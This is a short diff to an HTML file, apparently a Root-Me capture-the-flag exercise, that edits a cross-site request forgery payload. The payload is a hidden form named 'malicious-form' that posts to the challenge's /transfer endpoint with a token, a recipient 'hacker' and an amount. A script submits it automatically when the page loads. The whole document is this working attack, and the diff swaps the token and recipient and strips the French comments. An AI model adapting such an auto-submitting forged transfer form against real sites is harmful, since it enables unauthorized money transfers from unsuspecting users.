@@ -1,9 +1,9 @@
 <form id="malicious-form" action="https://bankme-2.challenges.pro.root-me.org/transfer" method="post">
-    <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6aGFja2VyOjk5"> <!-- Utilise le même token -->
-    <input type="text" name="recipient" value="hacker2"> <!-- Ton compte -->
-    <input type="number" name="amount" value="1"> <!-- Montant à envoyer -->
+    <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6aGFja2VyOjk3">
+    <input type="text" name="recipient" value="hacker">
+    <input type="number" name="amount" value="1">
     <button type="submit">Send Money</button>
 </form>
 <script>
-    document.getElementById('malicious-form').submit(); // Soumet automatiquement le formulaire
+    document.getElementById('malicious-form').submit();
 </script>
